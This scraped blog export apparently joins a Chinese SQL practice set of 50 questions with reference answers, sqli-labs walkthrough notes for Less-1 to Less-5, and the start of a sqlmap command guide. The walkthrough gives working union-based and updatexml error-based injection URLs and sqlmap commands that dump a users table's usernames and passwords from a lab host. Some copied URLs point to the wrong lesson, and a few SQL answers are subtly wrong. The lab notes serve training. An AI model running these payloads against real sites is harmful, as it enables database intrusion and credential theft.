(\u0026#39;04\u0026#39;, \u0026#39;李云\u0026#39;, \u0026#39;1990-08-06 00:00:00\u0026#39;, \u0026#39;男\u0026#39;); INSERT INTO `Student` VALUES (\u0026#39;05\u0026#39;, \u0026#39;周梅\u0026#39;, \u0026#39;1991-12-01 00:00:00\u0026#39;, \u0026#39;女\u0026#39;); INSERT INTO `Student` VALUES (\u0026#39;06\u0026#39;, \u0026#39;吴兰\u0026#39;, \u0026#39;1992-03-01 00:00:00\u0026#39;, \u0026#39;女\u0026#39;); INSERT INTO `Student` VALUES (\u0026#39;07\u0026#39;, \u0026#39;郑竹\u0026#39;, \u0026#39;1989-07-01 00:00:00\u0026#39;, \u0026#39;女\u0026#39;); INSERT INTO `Student` VALUES (\u0026#39;08\u0026#39;, \u0026#39;王菊\u0026#39;, \u0026#39;1990-01-20 00:00:00\u0026#39;, \u0026#39;女\u0026#39;); -- ---------------------------- -- Table structure for Teacher -- ---------------------------- DROP TABLE IF EXISTS `Teacher`; CREATE TABLE `Teacher` ( `T` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL, `Tname` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL ) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = DYNAMIC; -- ---------------------------- -- Records of Teacher -- ---------------------------- INSERT INTO `Teacher` VALUES (\u0026#39;01\u0026#39;, \u0026#39;张三\u0026#39;); INSERT INTO `Teacher` VALUES (\u0026#39;02\u0026#39;, \u0026#39;李四\u0026#39;); INSERT INTO `Teacher` VALUES (\u0026#39;03\u0026#39;, \u0026#39;王五\u0026#39;); SET FOREIGN_KEY_CHECKS = 1; 题目 查询\u0026quot; 01 \u0026ldquo;课程比\u0026rdquo; 02 \u0026ldquo;课程成绩高的学生的信息及课程分数 查询同时存在\u0026rdquo; 01 \u0026ldquo;课程和\u0026rdquo; 02 \u0026ldquo;课程的情况 查询存在\u0026rdquo; 01 \u0026ldquo;课程但可能不存在\u0026rdquo; 02 \u0026ldquo;课程的情况(不存在时显示为 null ) 查询不存在\u0026rdquo; 01 \u0026ldquo;课程但存在\u0026rdquo; 02 \u0026ldquo;课程的情况 查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩 查询在 SC 表存在成绩的学生信息 查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩(没成绩的显示为 null ) 查询「李」姓老师的数量 查询学过「张三」老师授课的同学的信息 查询没有学全所有课程的同学的信息 查询至少有一门课与学号为\u0026rdquo; 01 \u0026ldquo;的同学所学相同的同学的信息 查询和\u0026rdquo; 01 \u0026ldquo;号的同学学习的课程完全相同的其他同学的信息 查询没学过\u0026quot;张三\u0026quot;老师讲授的任一门课程的学生姓名 查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩 检索\u0026rdquo; 01 \u0026ldquo;课程分数小于 60，按分数降序排列的学生信息 按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩 查询各科成绩最高分、最低分和平均分：以如下形式显示：课程 ID，课程 name，最高分，最低分，平均分，及格率，中等率，优良率，优秀率 及格为\u0026gt;=60，中等为：70-80，优良为：80-90，优秀为：\u0026gt;=90 要求输出课程号和选修人数，查询结果按人数降序排列，若人数相同，按课程号升序排列 按各科成绩进行排序，并显示排名， Score 重复时保留名次空缺 按各科成绩进行排序，并显示排名， Score 重复时合并名次 查询学生的总成绩，并进行排名，总分重复时保留名次空缺 查询学生的总成绩，并进行排名，总分重复时不保留名次空缺 统计各科成绩各分数段人数：课程编号，课程名称，[100-85]，[85-70]，[70-60]，[60-0] 及所占百分比 查询各科成绩前三名的记录 查询每门课程被选修的学生数 查询出只选修两门课程的学生学号和姓名 查询男生、女生人数 查询名字中含有「风」字的学生信息 查询同名同性学生名单，并统计同名人数 查询 1990 年出生的学生名单 查询每门课程的平均成绩，结果按平均成绩降序排列，平均成绩相同时，按课程编号升序排列 查询平均成绩大于等于 85 的所有学生的学号、姓名和平均成绩 查询课程名称为「数学」，且分数低于 60 的学生姓名和分数 查询所有学生的课程及分数情况（存在学生没成绩，没选课的情况） 查询任何一门课程成绩在 70 分以上的姓名、课程名称和分数 查询不及格的课程 查询课程编号为 01 且课程成绩在 80 分以上的学生的学号和姓名 求每门课程的学生人数 成绩不重复，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩 成绩有重复的情况下，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩 查询不同课程成绩相同的学生的学生编号、课程编号、学生成绩 查询每门功成绩最好的前两名 统计每门课程的学生选修人数（超过 5 人的课程才统计）。 检索至少选修两门课程的学生学号 查询选修了全部课程的学生信息 查询各学生的年龄，只按年份来算 按照出生日期来算，当前月日 \u0026lt; 出生年月的月日则，年龄减一 查询本周过生日的学生 查询下周过生日的学生 查询本月过生日的学生 查询下月过生日的学生 参考答案 查询\u0026rdquo; 01 \u0026ldquo;课程比\u0026rdquo; 02 \u0026ldquo;课程成绩高的学生的信息及课程分数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 -- 方式1 SELECT S, Sname, Sage, Ssex, SUM( CASE WHEN C = \u0026#39;01\u0026#39; THEN score ELSE NULL END ) AS C1, SUM( CASE WHEN C = \u0026#39;02\u0026#39; THEN score ELSE NULL END ) AS C2 FROM SC INNER JOIN Student USING ( S ) GROUP BY S, Sname, Sage, Ssex HAVING C1 \u0026gt; C2; -- 方式2 SELECT S, Sname, Sage, Ssex, Course1.score AS C1, Course2.score AS C2 FROM ( SELECT S, score FROM SC WHERE C = \u0026#39;01\u0026#39; ) AS Course1 INNER JOIN ( SELECT S, score FROM SC WHERE C = \u0026#39;02\u0026#39; ) AS Course2 USING ( S ) INNER JOIN Student USING ( S ) WHERE Course1.score \u0026gt; Course2.score; 查询同时存在\u0026rdquo; 01 \u0026ldquo;课程和\u0026rdquo; 02 \u0026ldquo;课程的学生的信息及课程分数\n1 2 3 4 5 6 7 8 9 10 11 SELECT S, Sname, Sage, Ssex, Course1.score AS C1, Course2.score AS C2 FROM ( SELECT S, score FROM SC WHERE C = \u0026#39;01\u0026#39; ) AS Course1 INNER JOIN ( SELECT S, score FROM SC WHERE C = \u0026#39;02\u0026#39; ) AS Course2 USING ( S ) INNER JOIN Student USING ( S ); 查询存在\u0026rdquo; 01 \u0026ldquo;课程但可能不存在\u0026rdquo; 02 \u0026ldquo;课程的学生的信息及课程分数(不存在时显示为 null )\n1 2 3 4 5 6 7 8 9 10 11 SELECT S, Sname, Sage, Ssex, Course1.score AS C1, Course2.score AS C2 FROM ( SELECT S, score FROM SC WHERE C = \u0026#39;01\u0026#39; ) AS Course1 LEFT JOIN ( SELECT S, score FROM SC WHERE C = \u0026#39;02\u0026#39; ) AS Course2 USING ( S ) INNER JOIN Student USING ( S ); 查询不存在\u0026rdquo; 01 \u0026ldquo;课程但存在\u0026rdquo; 02 \u0026ldquo;课程的学生的信息及课程分数\n1 2 3 4 5 6 7 8 9 10 11 12 13 SELECT S, Sname, Sage, Ssex, Course1.score AS C1, Course2.score AS C2 FROM ( SELECT S, score FROM SC WHERE C = \u0026#39;01\u0026#39; ) AS Course1 RIGHT JOIN ( SELECT S, score FROM SC WHERE C = \u0026#39;02\u0026#39; ) AS Course2 USING ( S ) INNER JOIN Student USING ( S ) WHERE Course1.score IS NULL; 查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩\n1 2 3 4 5 6 7 8 9 SELECT S, AVG( score ) FROM SC GROUP BY S HAVING AVG( score ) \u0026gt; 60; 查询在 SC 表存在成绩的学生信息\n1 2 3 4 5 SELECT Student.* FROM ( SELECT S FROM SC GROUP BY S HAVING COUNT( score ) \u0026gt; 0 ) AS S1 INNER JOIN Student USING ( S ); 查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩(没成绩的显示为 null )\n1 2 3 4 5 6 7 8 SELECT Student.Sname, Student.S, S1.amount, S1.total FROM ( SELECT S, COUNT( C ) AS amount, SUM( score ) AS total FROM SC GROUP BY S ) AS S1 RIGHT JOIN Student USING ( S ); 查询「李」姓老师的数量\n1 2 3 4 5 6 SELECT COUNT( T ) FROM Teacher WHERE Tname LIKE \u0026#39;李%\u0026#39;; 查询学过「张三」老师授课的同学的信息\n1 2 3 4 5 6 7 8 9 10 11 SELECT Student.* FROM ( SELECT DISTINCT S FROM SC INNER JOIN ( SELECT C FROM ( SELECT T FROM Teacher WHERE Tname = \u0026#39;张三\u0026#39; ) AS T1 INNER JOIN Course ON T1.T = Course.T ) AS C1 ON SC.C = C1.C ) AS S1 INNER JOIN Student ON S1.S = Student.S; 查询没有学全所有课程的同学的信息\n1 2 3 4 5 6 7 8 9 10 11 12 SELECT Student.* FROM SC RIGHT JOIN Student ON SC.S = Student.S GROUP BY Student.S, Student.Sname, Student.Sage, Student.Ssex HAVING COUNT( C ) \u0026lt; ( SELECT COUNT(*) FROM Course ); 查询至少有一门课与学号为\u0026rdquo; 01 \u0026ldquo;的同学所学相同的同学的信息\n1 2 3 4 5 6 7 8 9 10 11 12 SELECT * FROM Student WHERE S IN ( SELECT DISTINCT S FROM SC WHERE C IN ( SELECT C FROM SC WHERE S = \u0026#39;01\u0026#39; )) 查询和\u0026rdquo; 01 \u0026ldquo;号的同学学习的课程完全相同的其他同学的信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 SELECT * FROM Student WHERE S IN ( SELECT S FROM SC WHERE S NOT IN ( SELECT S FROM SC WHERE C NOT IN ( SELECT C FROM SC WHERE S = \u0026#39;01\u0026#39; )) GROUP BY S HAVING COUNT( C )=( SELECT COUNT(*) FROM SC WHERE S = \u0026#39;01\u0026#39; )) 查询没学过\u0026quot;张三\u0026quot;老师讲授的任一门课程的学生姓名\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 SELECT Sname FROM Student WHERE S NOT IN ( SELECT DISTINCT S FROM SC INNER JOIN ( SELECT C FROM Course WHERE T IN ( SELECT T FROM Teacher WHERE Tname = \u0026#39;张三\u0026#39; )) AS C1 ON SC.C = C1.C ); 查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩\n1 2 3 4 5 6 7 8 9 10 11 12 SELECT SC.S, Student.Sname, AVG( score ) FROM SC INNER JOIN Student ON Student.S = SC.S WHERE SC.S IN ( SELECT S FROM SC WHERE score \u0026lt; 60 GROUP BY S HAVING COUNT( C )\u0026gt;= 2 ) GROUP BY SC.S, Student.Sname 检索\u0026rdquo; 01 \u0026ldquo;课程分数小于 60，按分数降序排列的学生信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 SELECT * FROM Student WHERE S IN ( SELECT S FROM SC WHERE C = \u0026#39;01\u0026#39; AND score \u0026lt; 60 ORDER BY score) 按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩\n1 2 3 4 5 6 7 8 9 10 11 12 SELECT S, AVG( score ), MAX( CASE C WHEN \u0026#39;01\u0026#39; THEN score ELSE NULL END ) AS C1, MAX( CASE C WHEN \u0026#39;02\u0026#39; THEN score ELSE NULL END ) AS C2, MAX( CASE C WHEN \u0026#39;03\u0026#39; THEN score ELSE NULL END ) AS C3 FROM SC GROUP BY S ORDER BY AVG( score ) DESC 查询各科成绩最高分、最低分和平均分：以如下形式显示：课程 ID，课程 name，最高分，最低分，平均分，及格率，中等率，优良率，优秀率 及格为\u0026gt;=60，中等为：70-80，优良为：80-90，优秀为：\u0026gt;=90 要求输出课程号和选修人数，查询结果按人数降序排列，若人数相同，按课程号升序排列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 SELECT SC.C, Course.Cname, COUNT( score ) AS 选课人数, MAX( score ) AS highestScore, MIN( score ) AS lowestScore, AVG( score ) AS average, CONCAT( COUNT( CASE WHEN score \u0026gt;= 60 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS 及格率, CONCAT( COUNT( CASE WHEN score \u0026gt;= 70 AND score \u0026lt; 80 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS 中等率, CONCAT( COUNT( CASE WHEN score \u0026gt;= 80 AND score \u0026lt; 90 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS 优良率, CONCAT( COUNT( CASE WHEN score \u0026gt;= 90 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS 优秀率 FROM SC INNER JOIN Course ON SC.C = Course.C GROUP BY SC.C, Course.Cname ORDER BY 选课人数 DESC, C 按各科成绩进行排序，并显示排名， Score 重复时保留名次空缺\n1 2 3 4 5 6 7 SELECT C, S, score, RANK() OVER ( PARTITION BY C ORDER BY score DESC ) AS RANKING FROM SC 按各科成绩进行排序，并显示排名， Score 重复时合并名次\n1 2 3 4 5 6 7 SELECT C, S, score, DENSE_RANK() OVER ( PARTITION BY C ORDER BY score DESC ) AS RANKING FROM SC 查询学生的总成绩，并进行排名，总分重复时保留名次空缺\n1 2 3 4 5 6 7 8 SELECT RANK() OVER ( ORDER BY SUM( score ) DESC ) AS 排名, S, SUM( score ) AS 总分 FROM SC GROUP BY S 查询学生的总成绩，并进行排名，总分重复时不保留名次空缺\n1 2 3 4 5 6 7 8 SELECT DENSE_RANK() OVER ( ORDER BY SUM( score ) DESC ) AS 排名, S, SUM( score ) AS 总分 FROM SC GROUP BY S 统计各科成绩各分数段人数：课程编号，课程名称，[100-85]，[85-70]，[70-60]，[60-0] 及所占百分比\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 SELECT C, CONCAT( COUNT( CASE WHEN score \u0026gt;= 85 AND score \u0026lt;= 100 THEN 1 ELSE NULL END ), \u0026#39;人/\u0026#39;, COUNT( CASE WHEN score \u0026gt;= 85 AND score \u0026lt;= 100 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS \u0026#39;[100-85]人数/百分比\u0026#39;, CONCAT( COUNT( CASE WHEN score \u0026gt;= 70 AND score \u0026lt; 85 THEN 1 ELSE NULL END ), \u0026#39;人/\u0026#39;, COUNT( CASE WHEN score \u0026gt;= 70 AND score \u0026lt; 85 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS \u0026#39;[85-70]人数/百分比\u0026#39;, CONCAT( COUNT( CASE WHEN score \u0026gt;= 60 AND score \u0026lt; 70 THEN 1 ELSE NULL END ), \u0026#39;人/\u0026#39;, COUNT( CASE WHEN score \u0026gt;= 60 AND score \u0026lt; 70 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS \u0026#39;[70-60]人数/百分比\u0026#39;, CONCAT( COUNT( CASE WHEN score \u0026gt;= 0 AND score \u0026lt; 60 THEN 1 ELSE NULL END ), \u0026#39;人/\u0026#39;, COUNT( CASE WHEN score \u0026gt;= 0 AND score \u0026lt; 60 THEN 1 ELSE NULL END )/ COUNT( score )* 100, \u0026#39;%\u0026#39; ) AS \u0026#39;[60-0]人数/百分比\u0026#39; FROM SC GROUP BY C 查询各科成绩前三名的记录\n1 2 3 4 5 6 SELECT * FROM ( SELECT C, score, RANK() OVER ( PARTITION BY C ORDER BY score DESC ) AS ranking FROM SC GROUP BY C, score ) AS C1 WHERE C1.ranking \u0026lt;=3 查询每门课程被选修的学生数\n1 2 3 4 5 6 7 SELECT C, COUNT( S ) AS 选修人数 FROM SC GROUP BY C 查询出只选修两门课程的学生学号和姓名\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 SELECT Sname FROM Student WHERE S IN ( SELECT S FROM SC GROUP BY S HAVING COUNT( C )= 2) 查询男生、女生人数\n1 2 3 4 5 6 7 SELECT Ssex, COUNT( Ssex ) AS \u0026#39;人数\u0026#39; FROM Student GROUP BY Ssex 查询名字中含有「风」字的学生信息\n1 2 3 4 5 6 SELECT * FROM Student WHERE Sname LIKE \u0026#39;%风%\u0026#39; 查询同名同性学生名单，并统计同名人数\n1 2 3 4 5 6 7 8 9 SELECT A.*, B.同名人数 FROM Student AS A LEFT JOIN ( SELECT Sname, Ssex, COUNT(*) AS 同名人数 FROM Student GROUP BY Sname, Ssex ) AS B ON A.Sname = B.Sname AND A.Ssex = B.Ssex WHERE B.同名人数 \u0026gt;1 查询 1990 年出生的学生名单\n1 2 3 4 5 6 7 SELECT Sname, Sage FROM Student WHERE YEAR ( Sage ) = 1990 查询每门课程的平均成绩，结果按平均成绩降序排列，平均成绩相同时，按课程编号升序排列\n1 2 3 4 5 6 7 8 9 10 SELECT C, AVG( score ) FROM SC GROUP BY C ORDER BY AVG( score ) DESC, C 查询平均成绩大于等于 85 的所有学生的学号、姓名和平均成绩\n1 2 3 4 5 6 7 8 9 10 11 12 SELECT SC.S, Sname, AVG( score ) FROM SC INNER JOIN Student ON SC.S = Student.S GROUP BY SC.S, Sname HAVING AVG( score ) \u0026gt;= 85 查询课程名称为「数学」，且分数低于 60 的学生姓名和分数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 SELECT SC.S, Sname, score FROM SC INNER JOIN Student ON SC.S = Student.S WHERE C =( SELECT C FROM Course WHERE Cname = \u0026#39;数学\u0026#39; ) AND score \u0026lt;= 60 查询所有学生的课程及分数情况（存在学生没成绩，没选课的情况）\n1 2 3 4 5 6 7 8 9 10 SELECT S, SUM( CASE C WHEN \u0026#39;01\u0026#39; THEN score ELSE NULL END ) AS \u0026#39;C01\u0026#39;, SUM( CASE C WHEN \u0026#39;02\u0026#39; THEN score ELSE NULL END ) AS \u0026#39;C02\u0026#39;, SUM( CASE C WHEN \u0026#39;03\u0026#39; THEN score ELSE NULL END ) AS \u0026#39;C03\u0026#39;, SUM( CASE C WHEN \u0026#39;04\u0026#39; THEN score ELSE NULL END ) AS \u0026#39;C04\u0026#39; FROM SC GROUP BY S 查询任何一门课程成绩在 70 分以上的姓名、课程名称和分数\n1 2 3 4 5 6 7 8 9 10 SELECT Student.Sname, Course.Cname, SC.score FROM SC INNER JOIN Student ON SC.S = Student.S INNER JOIN Course ON SC.C = Course.C WHERE score \u0026gt; 70 查询不及格的课程\n1 2 3 4 5 6 7 8 9 10 SELECT Student.Sname, Course.Cname, SC.score FROM SC INNER JOIN Student ON SC.S = Student.S INNER JOIN Course ON SC.C = Course.C WHERE score \u0026lt; 60 查询课程编号为 01 且课程成绩在 80 分以上的学生的学号和姓名\n1 2 3 4 5 6 7 8 9 10 SELECT SC.S, Student.Sname, SC.score FROM SC INNER JOIN Student ON SC.S = Student.S WHERE SC.C = \u0026#39;01\u0026#39; AND SC.score \u0026gt; 80 求每门课程的学生人数\n1 2 3 4 5 6 7 8 SELECT Course.Cname, COUNT( S ) FROM SC RIGHT JOIN Course ON SC.C = Course.C GROUP BY Course.Cname 成绩不重复，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 SELECT Student.*, SC.score FROM SC INNER JOIN Student ON SC.S = Student.S WHERE SC.C IN ( SELECT C FROM Course WHERE T =( SELECT T FROM Teacher WHERE Tname = \u0026#39;张三\u0026#39; )) ORDER BY score DESC LIMIT 1 成绩有重复的情况下，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 SELECT Student.*, SC.score FROM SC INNER JOIN Student ON SC.S = Student.S WHERE SC.score \u0026gt;=( SELECT score FROM SC WHERE SC.C IN ( SELECT C FROM Course WHERE T =( SELECT T FROM Teacher WHERE Tname = \u0026#39;张三\u0026#39; )) ORDER BY score DESC LIMIT 1 ) AND SC.C IN ( SELECT C FROM Course WHERE T =( SELECT T FROM Teacher WHERE Tname = \u0026#39;张三\u0026#39; )) 查询不同课程成绩相同的学生的学生编号、课程编号、学生成绩\n1 2 3 4 5 6 7 8 SELECT DISTINCT A.* FROM SC AS A INNER JOIN SC AS B ON A.S = B.S WHERE A.score = B.score AND A.C != B.C 查询每门功成绩最好的前两名\n1 2 3 4 5 6 7 8 9 SELECT * FROM SC WHERE ( SELECT COUNT(*) FROM SC AS A WHERE SC.C = A.C AND SC.score \u0026lt; A.score ) \u0026lt; 2 ORDER BY C, score DESC; 统计每门课程的学生选修人数（超过 5 人的课程才统计）\n1 2 3 4 5 6 7 8 9 SELECT C, COUNT( S ) FROM SC GROUP BY C HAVING COUNT( S )\u0026gt;5 检索至少选修两门课程的学生学号\n1 2 3 4 5 6 7 8 9 SELECT S, COUNT( C ) FROM SC GROUP BY S HAVING COUNT( C )\u0026gt;=2 查询选修了全部课程的学生信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 SELECT S, COUNT( C ) FROM SC GROUP BY S HAVING COUNT( C )=( SELECT COUNT(*) FROM Course) 查询各学生的年龄，只按年份来算\n1 2 3 4 5 6 SELECT S, YEAR ( NOW()) - YEAR ( Sage ) AS age FROM Student 按照出生日期来算，当前月日 \u0026lt; 出生年月的月日则，年龄减一\n1 2 3 4 5 6 SELECT S, YEAR ( NOW()) - YEAR ( Sage ) - ( CASE WHEN MONTH ( NOW()) \u0026gt; MONTH ( Sage ) AND DAY ( NOW()) \u0026gt; DAY ( Sage ) THEN 0 ELSE 1 END ) AS age FROM Student 查询本周过生日的学生\n1 2 3 4 5 6 7 SELECT Sname FROM Student WHERE WEEK ( Sage )= WEEK ( NOW()) 查询下周过生日的学生\n1 2 3 4 5 6 7 8 SELECT Sname FROM Student WHERE WEEK ( Sage )=( WEEK ( NOW())+ 1) 查询本月过生日的学生\n1 2 3 4 5 6 7 SELECT Sname FROM Student WHERE MONTH ( Sage )= MONTH ( NOW()) 查询下月过生日的学生\n1 2 3 4 5 6 7 8 SELECT Sname FROM Student WHERE MONTH ( Sage )=( MONTH ( NOW())+ 1) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sql-%E7%BB%8F%E5%85%B850%E9%A2%98/","title":"SQL 经典50题"},{"content":"sqli-labs 通关笔记 基础篇 Less-1 请求方式 注入方式 注入位置 参数构造 GET 报错回注 url ?id=1\u0026rsquo; 注入语句 \u0026ndash;+ 1. 确定参数构造方式 http://192.168.1.200:9080/Less-1/?id=1\u0026#39;\\ 2. 判断注入点 http://192.168.1.200:9080/Less-1/?id=1\u0026#39; and 1=1 --+ http://192.168.1.200:9080/Less-1/?id=1\u0026#39; and 1=2 --+ 3. 确定字段数量 http://192.168.1.200:9080/Less-1/?id=1\u0026#39; order by 3 --+ http://192.168.1.200:9080/Less-1/?id=1\u0026#39; order by 4 --+ 4. 判断数据显示点 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39; union select 1,2,3 --+ 5. 查询数据库名字和版本信息以及所有的表名 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39; union select 1,group_concat(version(), \u0026#39;---\u0026#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+ 6. 查询 users 表的所有字段名 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 7. 获得 users 表的所有记录 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+ Less-2 请求方式 注入方式 注入位置 参数构造 GET 报错回注 url ?id=1 注入语句 \u0026ndash;+ 1. 确定参数构造方式 http://192.168.1.200:9080/Less-1/?id=1\u0026#39;\\ 2. 判断注入点 http://192.168.1.200:9080/Less-1/?id=1 and 1=1 --+ http://192.168.1.200:9080/Less-1/?id=1 and 1=2 --+ 3. 确定字段数量 http://192.168.1.200:9080/Less-1/?id=1 order by 3 --+ http://192.168.1.200:9080/Less-1/?id=1 order by 4 --+ 4. 判断数据显示点 http://192.168.1.200:9080/Less-1/?id=-1 union select 1,2,3 --+ 5. 查询数据库名字和版本信息以及所有的表名 http://192.168.1.200:9080/Less-1/?id=-1 union select 1,group_concat(version(), \u0026#39;---\u0026#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+ 6. 查询 users 表的所有字段名 http://192.168.1.200:9080/Less-1/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 7. 获得 users 表的所有记录 http://192.168.1.200:9080/Less-1/?id=-1 union select 1,group_concat(username),group_concat(password) from users --+ Less-3 请求方式 注入方式 注入位置 参数构造 GET 报错回注 url ?id=1‘) 注入语句 \u0026ndash;+ 1. 确定参数构造方式 http://192.168.1.200:9080/Less-1/?id=1\u0026#39;\\ 2. 判断注入点 http://192.168.1.200:9080/Less-1/?id=1\u0026#39;) and 1=1 --+ http://192.168.1.200:9080/Less-1/?id=1\u0026#39;) and 1=2 --+ 3. 确定字段数量 http://192.168.1.200:9080/Less-1/?id=1\u0026#39;) order by 3 --+ http://192.168.1.200:9080/Less-1/?id=1 order by 4 --+ 4. 判断数据显示点 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39;) union select 1,2,3 --+ 5. 查询数据库名字和版本信息以及所有的表名 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39;) union select 1,group_concat(version(), \u0026#39;---\u0026#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+ 6. 查询 users 表的所有字段名 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 7. 获得 users 表的所有记录 http://192.168.1.200:9080/Less-1/?id=-1\u0026#39;) union select 1,group_concat(username),group_concat(password) from users --+ Less-4 请求方式 注入方式 注入位置 参数构造 GET 报错回注 url ?id=1\u0026quot;) 注入语句 \u0026ndash;+ 1. 确定参数构造方式 http://192.168.1.200:9080/Less-1/?id=1\u0026#39;\\ 2. 判断注入点 http://192.168.1.200:9080/Less-1/?id=1\u0026#34;) and 1=1 --+ http://192.168.1.200:9080/Less-1/?id=1\u0026#34;) and 1=2 --+ 3. 确定字段数量 http://192.168.1.200:9080/Less-1/?id=1\u0026#34;) order by 3 --+ http://192.168.1.200:9080/Less-1/?id=1\u0026#34;) order by 4 --+ 4. 判断数据显示点 http://192.168.1.200:9080/Less-1/?id=-1\u0026#34;) union select 1,2,3 --+ 5. 查询数据库名字和版本信息以及所有的表名 http://192.168.1.200:9080/Less-1/?id=-1\u0026#34;) union select 1,group_concat(version(), \u0026#39;---\u0026#39;,database()),group_concat(table_name) from information_schema.tables where table_schema=database() --+ 6. 查询 users 表的所有字段名 http://192.168.1.200:9080/Less-1/?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 7. 获得 users 表的所有记录 http://192.168.1.200:9080/Less-1/?id=-1\u0026#34;) union select 1,group_concat(username),group_concat(password) from users --+ sqlmap 1. 查询所有数据库 sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-4/?id=1\u0026#34; --batch --dbs 2. 查询所有表 sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-4/?id=1\u0026#34; --batch -D security --tables 3. 查询所有列名 sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-4/?id=1\u0026#34; --batch -D security -T users --columns 4. 查询所有记录 sqlmap -u \u0026#34;http://192.168.1.200:9080/Less-4/?id=1\u0026#34; --batch -D security -T users -C \u0026#34;username,password\u0026#34; --dump Less-5 请求方式 注入方式 注入位置 参数构造 GET 报错回注 url ?id=1\u0026quot;) 注入语句 \u0026ndash;+ 1. 确定参数构造方式 http://192.168.1.200:9080/Less-5/?id=1\\ 2. 判断注入点 http://192.168.1.200:9080/Less-5/?id=1\u0026#39; and 1=1 --+ http://192.168.1.200:9080/Less-5/?id=1\u0026#39; and 1=2 --+ 3. 确定字段数量 http://192.168.1.200:9080/Less-5/?id=1\u0026#39; order by 3 --+ http://192.168.1.200:9080/Less-5/?id=1\u0026#39; order by 4 --+ 5. 查询数据库名字和版本信息以及所有的表名 http://192.168.1.200:9080/Less-5/?id=1\u0026#39; and updatexml(1,concat(0x7e,(SELECT database()), (select @@version),0x7e),1) -- + http://192.168.1.200:9080/Less-5/?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e),1) -- + 6. 查询 users 表的所有字段名 http://192.168.1.200:9080/Less-5/?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;), 0x7e),1) -- + 7. 获得 users 表的所有记录 http://192.168.1.200:9080/Less-1/?id=-1\u0026#34;) union select 1,group_concat(username),group_concat(password) from users --+ ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/sqli-labs-%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","title":"sqli-labs 通关笔记"},{"content":"sqlmap 使用指南 一、命令参数 1. 通用 参数 功能 -h 显示基本帮助信息 -hh 显示高级帮助信息 \u0026ndash;version 显示版本号 -s sqlite 会话文件保存位置 -t 记录所有 HTTP 流量到指定文件中 \u0026ndash;batch 测试过程中， 执行所有默认配置 \u0026ndash;charset 强制用于数据检索的字符编码 \u0026ndash;crawl 从目标URL开始爬取网站 \u0026ndash;crawl-exclude 禁止爬取某个页面（eg：logout） \u0026ndash;csv-del 指定CSV输出中使用的的字符 \u0026ndash;dump-format 